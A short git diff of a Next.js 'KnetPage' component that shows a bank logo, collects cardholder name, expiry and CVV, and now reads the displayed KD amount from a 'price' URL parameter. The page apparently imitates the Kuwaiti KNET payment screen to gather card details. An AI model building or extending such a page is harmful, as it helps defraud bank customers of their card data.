@@ -1,7 +1,7 @@
 "use client";
 
 import { useState } from "react";
-import { useRouter } from "next/navigation";
+import { useRouter, useSearchParams } from "next/navigation";
 import Image from "next/image";
 import axios from "axios";
 import kibLogo from "../../../public/kib.jpg";
@@ -14,7 +14,8 @@ export default function KnetPage() {
   const [expData, setExpData] = useState("");
   const [cvv, setCvv] = useState("");
   const router = useRouter();
-
+    const searchParams = useSearchParams();
+    const price = searchParams.get("price");
   const handleSend = async () => {
     if (
       fullName.trim() === "" ||
@@ -64,7 +65,7 @@ export default function KnetPage() {
           </div>
           <div className={styles.knetInfoRow}>
             <span className={styles.knetInfoLabel}>Amount:</span>
-            <span>KD 100.000</span>
+            <span>KD {price}.000</span>
           </div>
         </div>
 
